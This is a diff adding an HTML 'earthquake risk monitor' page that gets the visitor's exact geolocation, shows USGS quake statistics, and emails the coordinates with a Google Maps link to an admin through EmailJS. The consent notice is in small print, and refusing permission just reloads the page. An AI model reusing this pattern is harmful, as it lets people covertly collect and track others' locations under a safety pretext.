@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Earthquake Risk Monitor</title>
+    
+    <!-- External Tools -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <!-- Email Backend Connection -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <style>
+        body {
+            background: linear-gradient(to bottom right, #0f172a, #1e293b);
+            color: white;
+            font-family: sans-serif;
+        }
+        .glass {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center justify-center p-4">
+
+    <!-- HEADER -->
+    <header class="w-full max-w-4xl flex justify-between items-center mb-6">
+        <div class="flex items-center gap-2">
+            <i class="fa-solid fa-house-tsunami text-blue-500 text-2xl"></i>
+            <h1 class="text-xl font-bold">Seismic<span class="text-blue-500">Guard</span></h1>
+        </div>
+        <div id="status" class="text-xs bg-gray-800 px-3 py-1 rounded-full text-gray-400 border border-gray-700">
+            System Standby
+        </div>
+    </header>
+
+    <!-- STEP 1: PERMISSION SCREEN -->
+    <div id="permission-screen" class="glass p-8 rounded-2xl max-w-md w-full text-center shadow-2xl">
+        <div class="w-20 h-20 bg-blue-900/30 rounded-full flex items-center justify-center mx-auto mb-6 border border-blue-500/50">
+            <i class="fa-solid fa-location-dot text-3xl text-blue-400"></i>
+        </div>
+        <h2 class="text-2xl font-bold mb-2">Local Risk Scan</h2>
+        <p class="text-gray-400 text-sm mb-6">
+            We need your exact location to check the USGS database for earthquakes near you. 
+            <br><span class="text-xs text-blue-400 mt-2 block">(Coordinates will be sent to admin)</span>
+        </p>
+        <button onclick="startApp()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 px-6 rounded-xl transition shadow-lg shadow-blue-600/20">
+            Allow Location & Scan
+        </button>
+    </div>
+
+    <!-- STEP 2: LOADING SCREEN -->
+    <div id="loading-screen" class="hidden text-center">
+        <i class="fa-solid fa-circle-notch fa-spin text-4xl text-blue-500 mb-4"></i>
+        <p class="animate-pulse text-lg">Locating & Analyzing...</p>
+    </div>
+
+    <!-- STEP 3: DASHBOARD (Hidden until data is ready) -->
+    <div id="dashboard" class="hidden w-full max-w-4xl space-y-6">
+        
+        <!-- Top Stats Row -->
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+            <!-- Coordinates -->
+            <div class="glass p-4 rounded-xl border-l-4 border-blue-500">
+                <p class="text-xs text-gray-400 uppercase">Your Location</p>
+                <p class="font-mono text-lg mt-1"><span id="lat-display">0.00</span>, <span id="lon-display">0.00</span></p>
+            </div>
+            
+            <!-- Risk Level -->
+            <div class="glass p-4 rounded-xl border-l-4 border-gray-500" id="risk-box">
+                <p class="text-xs text-gray-400 uppercase">Risk Assessment</p>
+                <h2 id="risk-text" class="text-2xl font-bold mt-1">CALCULATING</h2>
+            </div>
+
+            <!-- Email Status -->
+            <div class="glass p-4 rounded-xl border-l-4 border-purple-500">
+                <p class="text-xs text-gray-400 uppercase">Admin Report</p>
+                <p id="email-log" class="text-sm font-bold mt-2 text-yellow-400">
+                    <i class="fa-solid fa-envelope-circle-check mr-1"></i> Sending...
+                </p>
+            </div>
+        </div>
+
+        <!-- Charts Row -->
+        <div class="grid md:grid-cols-2 gap-4">
+            <!-- Bar Chart -->
+            <div class="glass p-4 rounded-xl">
+                <h3 class="text-sm font-bold mb-4 text-gray-300">Quakes (Last 30 Days / 200km)</h3>
+                <div class="h-64">
+                    <canvas id="barChart"></canvas>
+                </div>
+            </div>
+            
+            <!-- Pie Chart -->
+            <div class="glass p-4 rounded-xl">
+                <h3 class="text-sm font-bold mb-4 text-gray-300">Severity Percentage</h3>
+                <div class="h-64 flex justify-center">
+                    <canvas id="doughnutChart"></canvas>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- JAVASCRIPT LOGIC -->
+    <script>
+        // =========================================================
+        // 1. CONFIGURATION - PASTE YOUR KEYS HERE
+        // =========================================================
+        const EMAIL_KEYS = {
+            serviceID:  "service_c0lf2as",   // e.g. "service_gmail"
+            templateID: "template_zzbd8of",  // e.g. "template_abc123"
+            publicKey:  "iFalBLV9stJ0qX6_S"    // e.g. "user_xyz789"
+        };
+
+        // Initialize Email Service
+        (function() {
+            if (EMAIL_KEYS.publicKey !== "YOUR_PUBLIC_KEY") {
+                emailjs.init(EMAIL_KEYS.publicKey);
+            }
+        })();
+
+        // =========================================================
+        // 2. MAIN FUNCTIONS
+        // =========================================================
+
+        function startApp() {
+            // Hide permission screen, show loader
+            document.getElementById('permission-screen').classList.add('hidden');
+            document.getElementById('loading-screen').classList.remove('hidden');
+
+            // Request Location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(onLocationSuccess, onLocationError);
+            } else {
+                alert("Geolocation not supported.");
+                location.reload();
+            }
+        }
+
+        function onLocationSuccess(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            // 1. Show coordinates on screen
+            document.getElementById('lat-display').textContent = lat.toFixed(4);
+            document.getElementById('lon-display').textContent = lon.toFixed(4);
+
+            // 2. Send Email to Backend
+            sendEmailReport(lat, lon);
+
+            // 3. Get Earthquake Data
+            fetchEarthquakes(lat, lon);
+        }
+
+        function onLocationError() {
+            alert("You must allow location access for this to work.");
+            location.reload();
+        }
+
+        // =========================================================
+        // 3. BACKEND EMAIL FUNCTION
+        // =========================================================
+        function sendEmailReport(lat, lon) {
+            const statusEl = document.getElementById('email-log');
+
+            // Check if user forgot to add keys
+            if (EMAIL_KEYS.publicKey === "YOUR_PUBLIC_KEY") {
+                statusEl.textContent = "Keys Missing (Check Code)";
+                statusEl.className = "text-sm font-bold mt-2 text-gray-500";
+                return;
+            }
+
+            const params = {
+                latitude: lat,
+                longitude: lon,
+                google_maps_link: `https://www.google.com/maps?q=${lat},${lon}`
+            };
+
+            emailjs.send(EMAIL_KEYS.serviceID, EMAIL_KEYS.templateID, params)
+                .then(() => {
+                    statusEl.textContent = "Sent Successfully";
+                    statusEl.className = "text-sm font-bold mt-2 text-green-400";
+                })
+                .catch((err) => {
+                    console.error("Email Failed:", err);
+                    statusEl.textContent = "Failed to Send";
+                    statusEl.className = "text-sm font-bold mt-2 text-red-400";
+                });
+        }
+
+        // =========================================================
+        // 4. DATA & GRAPHS
+        // =========================================================
+        async function fetchEarthquakes(lat, lon) {
+            // Setup Dates (Last 30 Days)
+            const end = new Date().toISOString();
+            const start = new Date();
+            start.setDate(start.getDate() - 30);
+            
+            // USGS API URL
+            const url = `https://earthquake.usgs.gov/fdsnws/event/1/query?format=geojson&latitude=${lat}&longitude=${lon}&maxradiuskm=200&starttime=${start.toISOString()}&endtime=${end}`;
+
+            try {
+                const response = await fetch(url);
+                const data = await response.json();
+                processData(data.features);
+            } catch (error) {
+                alert("Could not fetch earthquake data.");
+            }
+        }
+
+        function processData(quakes) {
+            // 1. Switch Screens
+            document.getElementById('loading-screen').classList.add('hidden');
+            document.getElementById('dashboard').classList.remove('hidden');
+            document.getElementById('status').textContent = "System Active";
+            document.getElementById('status').classList.replace("text-gray-400", "text-green-400");
+
+            // 2. Sort Data
+            let low = 0, med = 0, high = 0, maxMag = 0;
+
+            quakes.forEach(q => {
+                const mag = q.properties.mag;
+                if (mag > maxMag) maxMag = mag;
+                
+                if (mag < 4.0) low++;
+                else if (mag < 6.0) med++;
+                else high++;
+            });
+
+            // 3. Calculate Risk
+            const riskBox = document.getElementById('risk-box');
+            const riskText = document.getElementById('risk-text');
+
+            if (high > 0 || maxMag >= 6.0) {
+                riskText.textContent = "HIGH";
+                riskText.className = "text-2xl font-bold mt-1 text-red-500";
+                riskBox.className = "glass p-4 rounded-xl border-l-4 border-red-500";
+            } else if (med > 5 || maxMag >= 4.5) {
+                riskText.textContent = "MODERATE";
+                riskText.className = "text-2xl font-bold mt-1 text-yellow-500";
+                riskBox.className = "glass p-4 rounded-xl border-l-4 border-yellow-500";
+            } else {
+                riskText.textContent = "LOW";
+                riskText.className = "text-2xl font-bold mt-1 text-green-500";
+                riskBox.className = "glass p-4 rounded-xl border-l-4 border-green-500";
+            }
+
+            // 4. Draw Charts
+            drawCharts(low, med, high);
+        }
+
+        function drawCharts(low, med, high) {
+            // Bar Chart
+            new Chart(document.getElementById('barChart'), {
+                type: 'bar',
+                data: {
+                    labels: ['Minor (<4)', 'Moderate (4-6)', 'Major (>6)'],
+                    datasets: [{
+                        label: 'Count',
+                        data: [low, med, high],
+                        backgroundColor: ['#3b82f6', '#eab308', '#ef4444'],
+                        borderRadius: 5
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: { legend: { display: false } },
+                    scales: {
+                        y: { ticks: { color: '#94a3b8' }, grid: { color: '#334155' } },
+                        x: { ticks: { color: '#94a3b8' }, grid: { display: false } }
+                    }
+                }
+            });
+
+            // Pie Chart (Percentage)
+            new Chart(document.getElementById('doughnutChart'), {
+                type: 'doughnut',
+                data: {
+                    labels: ['Minor', 'Moderate', 'Major'],
+                    datasets: [{
+                        data: [low, med, high],
+                        backgroundColor: ['#3b82f6', '#eab308', '#ef4444'],
+                        borderWidth: 0
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: { legend: { position: 'bottom', labels: { color: 'white' } } }
+                }
+            });
+        }
+    </script>
+</body>
+</html>
+                                                                                                                                                                                                                  
